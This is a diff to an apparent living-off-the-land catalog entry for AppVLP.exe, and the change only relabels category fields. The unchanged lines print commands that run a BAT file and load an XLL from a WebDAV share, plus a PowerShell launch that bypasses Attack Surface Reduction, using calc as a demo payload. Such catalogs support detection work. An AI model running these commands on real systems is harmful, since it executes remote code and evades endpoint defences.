@@ -7,7 +7,7 @@ Commands:
   - Command: AppVLP.exe \\webdav\calc.bat
     Usecase: Execution of BAT file hosted on Webdav server.
     Description: Executes calc.bat through AppVLP.exe
-    Categories: ['Execution', 'ASR Bypass']
+    Category: Execution
     Privileges: User
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
@@ -15,7 +15,7 @@ Commands:
   - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
     Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
     Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
-    Categories: ['Execution', 'ASR Bypass']
+    Category: Execution
     Privileges: User
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
@@ -23,7 +23,7 @@ Commands:
   - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
     Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
     Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
-    Categories: ['Execution', 'ASR Bypass']
+    Category: Execution
     Privileges: User
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
